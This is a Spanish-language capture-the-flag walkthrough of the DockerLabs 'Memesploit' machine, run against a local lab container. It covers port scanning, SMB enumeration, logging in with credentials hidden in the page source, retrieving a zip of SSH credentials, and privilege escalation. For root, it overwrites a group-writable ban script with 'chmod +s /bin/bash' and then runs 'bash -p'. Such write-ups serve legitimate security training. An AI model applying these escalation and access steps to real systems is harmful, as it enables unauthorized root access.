#MAQUINA #DOCKERLABS #MEDIO 
#ENUM4LINUX #CRACKMAPEXEC #SMBMAP #SMBCLIENT 
<hr>

# RECONOCIMIENTO

Vamos a resolver **Memesploit** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 15:30 CET
Initiating ARP Ping Scan at 15:30
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 15:30, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:30
Scanning 172.17.0.2 [65535 ports]
Discovered open port 139/tcp on 172.17.0.2
Discovered open port 445/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 15:30, 0.51s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000040s latency).
Scanned at 2025-03-24 15:30:45 CET for 1s
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** ,el puerto **22(SSH)** y los puertos **139** y **445** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80,139,445 172.17.0.2          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 15:32 CET
Nmap scan report for admin.s3cr3tdir.dev.gitea.dl (172.17.0.2)
Host is up (0.000017s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b1:4d:aa:b4:22:b4:7c:2e:53:3d:41:69:81:e3:c8:48 (ECDSA)
|_  256 59:16:7a:02:50:bd:8d:b5:06:30:1c:3d:01:e5:bf:81 (ED25519)
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Hacker Landing Page
|_http-server-header: Apache/2.4.58 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-03-24T14:32:36
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.39 seconds




```

   ```bash

nmap --script="http-enum" 172.17.0.2               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 15:33 CET
Nmap scan report for admin.s3cr3tdir.dev.gitea.dl (172.17.0.2)
Host is up (0.0000040s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds

```

```bash

enum4linux 172.17.0.2
 ========================================( Users on 172.17.0.2 )========================================
                                                                                                                                                                                          
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: memehydra        Name: memehydra Desc:                                                                                                     

user:[memehydra] rid:[0x3e8]


[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                               
                                                                                                                                                                                          
S-1-22-1-1001 Unix User\memesploit (Local User)                                                                                                                                           
S-1-22-1-1002 Unix User\memehydra (Local User)



```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## SMB (445)

Con enum4linux sacamos dos posibles usuarios -> **memehydra** y **memesploit**.

## HTTP (80)

AL hacer Ctrl +U, vemos unas palabras ocultas (dos de ellas resultan ser las claves SMB) : 

```bash
memehydra : fuerzabrutasiempre : memesploit_ctf
```


```bash
crackmapexec smb 172.17.0.2 -u memehydra -p fuerzabrutasiempre
SMB         172.17.0.2      445    62D20D0E9222     [*] Windows 6.1 Build 0 (name:62D20D0E9222) (domain:62D20D0E9222) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    62D20D0E9222     [+] 62D20D0E9222\memehydra:fuerzabrutasiempre
```

# EXPLOTACION

Vamos a ver que podemos ver gracias a **smbmap**:

```bash
smbmap -H 172.17.0.2 -u memehydra -p fuerzabrutasiempre

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 172.17.0.2:445  Name: admin.s3cr3tdir.dev.gitea.dl      Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        share_memehydra                                         READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (62d20d0e9222 server (Samba, Ubuntu))
[*] Closed 1 connections
```

Usamos **smbclient** para conectarnos :
```bash
smbclient //172.17.0.2/share_memehydra -U memehydra
Password for [WORKGROUP\memehydra]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Aug 31 17:15:13 2024
  ..                                  D        0  Sat Aug 31 17:15:13 2024
  secret.zip                          N      224  Sat Aug 31 17:15:06 2024

                229727556 blocks of size 1024. 185846524 blocks available
smb: \> get secret.zip 
getting file \secret.zip of size 224 as secret.zip (2240000.0 KiloBytes/sec) (average inf KiloBytes/sec)


```

Tenemos un zip cifrado, la contra es la restante de arriba.

```bash
cat secret.txt 
memesploit:metasploitelmejor

```

YA ESTAMOS COMO MEMESPLOIT.

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
memesploit@62d20d0e9222:/etc/login_monitor$ sudo -l
Matching Defaults entries for memesploit on 62d20d0e9222:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User memesploit may run the following commands on 62d20d0e9222:
    (ALL : ALL) NOPASSWD: /usr/sbin/service login_monitor restart

```

Vemos **un servicio login_monitor** con permisos SUDO , vamos a buscar que puede ser antes de hacer nada :

   ```bash
memesploit@62d20d0e9222:/etc/login_monitor$ find / -iname "*login_monitor*" 2>/dev/null
/etc/rc3.d/S01login_monitor
/etc/rc5.d/S01login_monitor
/etc/rc1.d/K01login_monitor
/etc/rc2.d/S01login_monitor
/etc/rc6.d/K01login_monitor
/etc/rc4.d/S01login_monitor
/etc/rc0.d/K01login_monitor
/etc/init.d/login_monitor
/etc/login_monitor
/run/login_monitor.pid
/var/log/login_monitor.log

memesploit@62d20d0e9222:/etc/login_monitor$ cat /var/log/login_monitor.log
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Capturando: 15:30:45.903643 IP 172.17.0.1.44261 > 62d20d0e9222.ssh: Flags [S], seq 3603856829, win 1024, options [mss 1460], length 0
Intento de conexión detectado. Total: 1
Capturando: 15:30:45.903647 IP 62d20d0e9222.ssh > 172.17.0.1.44261: Flags [S.], seq 1671547913, ack 3603856830, win 64240, options [mss 1460], length 0
Capturando: 15:30:45.903651 IP 172.17.0.1.44261 > 62d20d0e9222.ssh: Flags [R], seq 3603856830, win 0, length 0
Capturando: 15:32:24.039584 IP 172.17.0.1.60668 > 62d20d0e9222.ssh: Flags [S], seq 3995793104, win 1024, options [mss 1460], length 0
Intento de conexión detectado. Total: 2
Capturando: 15:32:24.039589 IP 62d20d0e9222.ssh > 172.17.0.1.60668: Flags [S.], seq 3626354406, ack 3995793105, win 64240, options [mss 1460], length 0
Capturando: 15:32:24.039595 IP 172.17.0.1.60668 > 62d20d0e9222.ssh: Flags [R], seq 3995793105, win 0, length 0
Capturando: 15:32:24.150729 IP 172.17.0.1.54302 > 62d20d0e9222.ssh: Flags [S], seq 1369986958, win 64240, options [mss 1460,sackOK,TS val 3194908661 ecr 0,nop,wscale 7], length 0
Intento de conexión detectado. Total: 3
Detectado un posible ataque de fuerza bruta en el puerto 22. Ejecutando /etc/login_monitor/actionban.sh.


```

Vemos que es un bloqueo anti-hydra, al intentar usar fuerza bruta se ejecuta el `/etc/login_monitor/actionban.sh`, que es de root, pero `/etc/login_monitor` pertenece al grupo security y memesploit pertenece a ese grupo por lo que borramos ese archivo y creamos otro nuevo para que cuando ejecutemos hydra e intentemos hacer fuerza bruta se ejecute el script:

```bash

memesploit@62d20d0e9222:/etc/login_monitor$ id
uid=1001(memesploit) gid=1001(memesploit) groups=1001(memesploit),100(users),1003(security)
memesploit@62d20d0e9222:/etc/login_monitor$ cat 
actionban.sh   activity.sh    loggin.conf    network.conf   network.sh     security.conf  security.sh    
memesploit@62d20d0e9222:/etc/login_monitor$ cat actionban.sh 
#!/bin/bash

chmod +s /bin/bash
memesploit@62d20d0e9222:/etc/login_monitor$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
memesploit@62d20d0e9222:/etc/login_monitor$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# 

```

**YA ESTAMOS COMO ROOT.**